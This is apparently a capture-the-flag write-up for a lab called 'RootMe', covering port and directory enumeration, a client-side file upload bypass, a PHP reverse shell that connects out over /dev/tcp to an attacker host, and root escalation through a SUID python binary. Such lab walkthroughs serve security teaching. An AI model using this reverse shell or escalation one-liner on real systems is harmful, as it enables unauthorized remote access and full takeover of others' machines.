---
title: "RootMe"
description: "A beginner-friendly CTF challenge focused on web enumeration and privilege escalation through a file upload vulnerability."
difficulty: "Easy"
tags: ["Web", "Privilege Escalation", "File Upload"]
date: "2025-06-01"
---

## Reconnaissance

Started with an **nmap** scan to discover open ports on the target:

```bash
nmap -sC -sV -oN nmap/initial 10.10.10.x
```

The scan revealed **two open ports**:
- **22/tcp** - SSH (OpenSSH)
- **80/tcp** - HTTP (Apache)

## Enumeration

Visited the website on port 80 and found a simple file upload page. Let's enumerate directories with **gobuster**:

```bash
gobuster dir -u http://10.10.10.x -w /usr/share/wordlists/dirb/common.txt
```

Found `/uploads` directory and `/panel` where the file upload form was hosted.

## Exploitation

The upload form only checked file extensions on the client side. Bypassed by intercepting with **Burp Suite** and changing the extension to `.php5`.

Uploaded a PHP reverse shell:

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.x.x/4444 0>&1'");
?>
```

Started a listener and triggered the shell:

```bash
nc -lvnp 4444
```

## Privilege Escalation

Found a SUID binary `/usr/bin/python` using:

```bash
find / -perm -4000 2>/dev/null
```

Escalated to root:

```bash
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**Flag captured!** 🚩
